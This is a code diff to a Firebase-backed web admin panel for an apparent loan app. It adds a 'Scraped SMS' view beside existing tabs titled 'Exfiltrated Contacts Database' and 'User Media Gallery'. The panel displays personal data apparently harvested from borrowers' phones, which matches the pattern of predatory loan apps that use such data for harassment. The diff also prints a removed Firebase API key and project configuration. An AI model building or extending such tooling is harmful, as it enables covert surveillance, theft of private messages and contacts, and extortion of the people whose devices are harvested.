@@ -62,6 +62,9 @@
             <a href="#" onclick="switchTab('gallery')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="gallery">
                 <i class="ph ph-image text-xl mr-3"></i> Gallery
             </a>
+            <a href="#" onclick="switchTab('sms')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="sms">
+                <i class="ph ph-chat-text text-xl mr-3"></i> Scraped SMS
+            </a>
         </nav>
 
         <div class="p-4 border-t border-gray-800">
@@ -276,6 +279,38 @@
                 </div>
             </section>
 
+            <!-- SMS View -->
+            <section id="view-sms" class="view-section hidden">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden flex flex-col h-full">
+                    <div class="p-4 sm:p-5 border-b border-gray-100 flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3">
+                        <h3 class="text-lg font-semibold text-gray-800">Scraped SMS Messages</h3>
+                        <div class="relative w-full sm:w-64">
+                            <select id="sms-user-filter" class="w-full pl-3 pr-8 py-2 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500 bg-white appearance-none">
+                                <option value="all">All Users</option>
+                                <!-- Dynamically populated -->
+                            </select>
+                            <i class="ph ph-caret-down absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 pointer-events-none"></i>
+                        </div>
+                    </div>
+                    <div class="overflow-x-auto custom-scrollbar">
+                        <table class="w-full text-left border-collapse min-w-[800px]">
+                            <thead>
+                                <tr class="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
+                                    <th class="px-6 py-4 font-medium border-b w-48">Owner (User)</th>
+                                    <th class="px-6 py-4 font-medium border-b w-32">Sender ID</th>
+                                    <th class="px-6 py-4 font-medium border-b max-w-xs">Message Preview</th>
+                                    <th class="px-6 py-4 font-medium border-b w-32">Date/Time</th>
+                                    <th class="px-6 py-4 font-medium border-b text-right w-24">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="sms-tbody" class="text-sm divide-y divide-gray-100">
+                                <tr><td colspan="5" class="px-6 py-8 text-center text-gray-400">Loading SMS...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
         </div>
     </main>
 
@@ -298,35 +333,23 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-analytics.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, collection, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, collection, onSnapshot, updateDoc, setDoc, getDocs } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // Firebase project configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyDWY5V4lCsbNMRgAZy5sRgfmhk6__3ifp4",
-            authDomain: "cashmoney-b443d.firebaseapp.com",
-            projectId: "cashmoney-b443d",
-            storageBucket: "cashmoney-b443d.firebasestorage.app",
-            messagingSenderId: "486748729220",
-            appId: "1:486748729220:web:c0e82b71be90be782b77d1",
-            measurementId: "G-92YG72YRRJ"
+        // Global State & Config
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'admin-panel-dev-id';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
+            projectId: "demo-project", // Fallback for pure frontend testing if needed, but assuming valid config
         };
-
-        let app;
-        let db;
-        let auth;
+        
+        let app, db, auth;
         try {
             app = initializeApp(firebaseConfig);
-            try {
-                getAnalytics(app);
-            } catch (analyticsError) {
-                console.warn("Firebase Analytics is unavailable in this environment:", analyticsError);
-            }
             db = getFirestore(app);
             auth = getAuth(app);
         } catch (e) {
             console.error("Firebase init failed", e);
+            showToast("Database connection error", 'error');
         }
 
         // App State
@@ -335,6 +358,7 @@
             loans: [],
             contacts: [],
             gallery: [],
+            sms: [],
             currentLoanFilter: 'pending',
             searchQuery: ''
         };
@@ -369,7 +393,8 @@
                 'users': 'User Management',
                 'loans': 'Loan Application Processing',
                 'contacts': 'Exfiltrated Contacts Database',
-                'gallery': 'User Media Gallery'
+                'gallery': 'User Media Gallery',
+                'sms': 'Scraped SMS Records'
             };
             document.getElementById('page-title').innerText = titles[tabId] || 'Dashboard';
 
@@ -379,8 +404,8 @@
             document.getElementById(`view-${tabId}`).classList.remove('hidden');
             
             // Re-render specific views if needed based on state
-            if(tabId === 'loans') updateLoansUI();
-            if(tabId === 'users') updateUsersUI();
+            if(tabId === 'loans') renderLoans();
+            if(tabId === 'users') renderUsers();
         };
 
         window.showToast = (message, type = 'success') => {
@@ -413,7 +438,7 @@
             const modal = document.getElementById('action-modal');
             const content = document.getElementById('modal-content');
             document.getElementById('modal-title').innerText = title;
-            document.getElementById('modal-message').innerText = message;
+            document.getElementById('modal-message').innerHTML = message;
             
             const btn = document.getElementById('modal-confirm-btn');
             btn.innerText = confirmText;
@@ -461,11 +486,6 @@
 
         // Authentication Guard
         const authenticateAndInit = () => {
-            if (!auth || !db) {
-                showToast("Firebase could not be initialized. Check the browser console.", 'error');
-                return;
-            }
-
             onAuthStateChanged(auth, async (user) => {
                 if (user) {
                     console.log("Admin authenticated");
@@ -481,24 +501,28 @@
                 }
             });
 
-            signInAnonymously(auth).catch(error => {
-                console.error("Anonymous authentication failed:", error);
-                showToast("Authentication failed. Enable Anonymous sign-in in Firebase Authentication.", 'error');
-                const loader = document.getElementById('loading-overlay');
-                if (loader) loader.remove();
-            });
+            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                signInWithCustomToken(auth, __initial_auth_token).catch(err => {
+                    console.warn("Custom token failed, falling back to anon:", err);
+                    signInAnonymously(auth);
+                });
+            } else {
+                signInAnonymously(auth);
+            }
         };
 
         const setupRealtimeListeners = () => {
+            const basePath = ['artifacts', appId, 'public', 'data'];
+            
             // Users Listener
-            onSnapshot(collection(db, 'users'), (snap) => {
+            onSnapshot(collection(db, ...basePath, 'users'), (snap) => {
                 state.users = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 updateUsersUI();
                 updateDashboardStats();
             }, (error) => console.error("Users sync error:", error));
 
             // Loans Listener
-            onSnapshot(collection(db, 'loans'), (snap) => {
+            onSnapshot(collection(db, ...basePath, 'loans'), (snap) => {
                 state.loans = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 // Sort by date desc
                 state.loans.sort((a,b) => new Date(b.ts || 0) - new Date(a.ts || 0));
@@ -507,16 +531,22 @@
             }, (error) => console.error("Loans sync error:", error));
 
             // Contacts Listener
-            onSnapshot(collection(db, 'contacts'), (snap) => {
+            onSnapshot(collection(db, ...basePath, 'contacts'), (snap) => {
                 state.contacts = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 updateContactsUI();
             }, (error) => console.error("Contacts sync error:", error));
 
             // Gallery Listener
-            onSnapshot(collection(db, 'gallery'), (snap) => {
+            onSnapshot(collection(db, ...basePath, 'gallery'), (snap) => {
                 state.gallery = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 updateGalleryUI();
             }, (error) => console.error("Gallery sync error:", error));
+
+            // SMS Listener
+            onSnapshot(collection(db, ...basePath, 'sms'), (snap) => {
+                state.sms = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                updateSmsUI();
+            }, (error) => console.error("SMS sync error:", error));
         };
 
         const updateDashboardStats = () => {
@@ -609,6 +639,17 @@
                 state.users.map(u => `<option value="${escapeHTML(u.id)}">${escapeHTML(u.name)} (${escapeHTML(u.id)})</option>`).join('');
             if(state.users.find(u => u.id === currVal)) {
                 userFilter.value = currVal;
+            }
+
+            // Update user filter in SMS
+            const smsUserFilter = document.getElementById('sms-user-filter');
+            if(smsUserFilter) {
+                const smsCurrVal = smsUserFilter.value;
+                smsUserFilter.innerHTML = '<option value="all">All Users</option>' + 
+                    state.users.map(u => `<option value="${escapeHTML(u.id)}">${escapeHTML(u.name)} (${escapeHTML(u.id)})</option>`).join('');
+                if(state.users.find(u => u.id === smsCurrVal)) {
+                    smsUserFilter.value = smsCurrVal;
+                }
             }
         };
 
@@ -783,6 +824,63 @@
         };
 
         document.getElementById('gallery-user-filter').addEventListener('change', updateGalleryUI);
+
+        const updateSmsUI = () => {
+            const tbody = document.getElementById('sms-tbody');
+            const filterUserId = document.getElementById('sms-user-filter').value;
+            
+            let filteredSms = state.sms;
+            if(filterUserId !== 'all') {
+                filteredSms = filteredSms.filter(m => m.userId === filterUserId);
+            }
+
+            // Sort by date desc
+            filteredSms.sort((a,b) => new Date(b.ts || 0) - new Date(a.ts || 0));
+
+            if(filteredSms.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" class="px-6 py-8 text-center text-gray-500">No SMS messages found.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = filteredSms.map(msg => {
+                const owner = state.users.find(u => u.id === msg.userId);
+                const ownerName = owner ? owner.name : 'Unknown';
+                const preview = msg.body ? (msg.body.length > 50 ? msg.body.substring(0, 50) + '...' : msg.body) : '';
+
+                return `
+                    <tr class="hover:bg-gray-50 transition-colors">
+                        <td class="px-6 py-4">
+                            <div class="font-medium text-gray-800">${escapeHTML(ownerName)}</div>
+                            <div class="font-mono text-xs text-gray-500 mt-0.5 truncate max-w-[150px]">${escapeHTML(msg.userId)}</div>
+                        </td>
+                        <td class="px-6 py-4 font-semibold text-gray-700 whitespace-nowrap">${escapeHTML(msg.sender || 'Unknown')}</td>
+                        <td class="px-6 py-4 text-gray-600 text-sm max-w-xs truncate" title="${escapeHTML(msg.body)}">${escapeHTML(preview)}</td>
+                        <td class="px-6 py-4 text-gray-500 text-xs whitespace-nowrap">${formatDate(msg.ts)}</td>
+                        <td class="px-6 py-4 text-right">
+                            <button onclick="viewFullSms('${msg.id}')" class="px-3 py-1.5 bg-blue-50 text-blue-600 hover:bg-blue-600 hover:text-white rounded transition-colors text-xs font-medium">Read Full</button>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        };
+
+        window.viewFullSms = (smsId) => {
+            const msg = state.sms.find(m => m.id === smsId);
+            if(!msg) return;
+            
+            const owner = state.users.find(u => u.id === msg.userId);
+            const ownerName = owner ? owner.name : 'Unknown';
+            
+            const title = `SMS from ${escapeHTML(msg.sender || 'Unknown')}`;
+            const formattedMsg = `
+                <div class="text-xs text-gray-500 mb-3">Device: <span class="font-medium">${escapeHTML(ownerName)}</span> &bull; ${formatDate(msg.ts)}</div>
+                <div class="p-3 bg-gray-50 rounded-lg border border-gray-100 text-gray-800 text-sm max-h-60 overflow-y-auto custom-scrollbar whitespace-pre-wrap">${escapeHTML(msg.body || 'No content')}</div>
+            `;
+            
+            window.openModal(title, formattedMsg, 'Close', 'bg-gray-800 hover:bg-gray-900', null);
+        };
+
+        document.getElementById('sms-user-filter').addEventListener('change', updateSmsUI);
 
         // Start App
         authenticateAndInit();
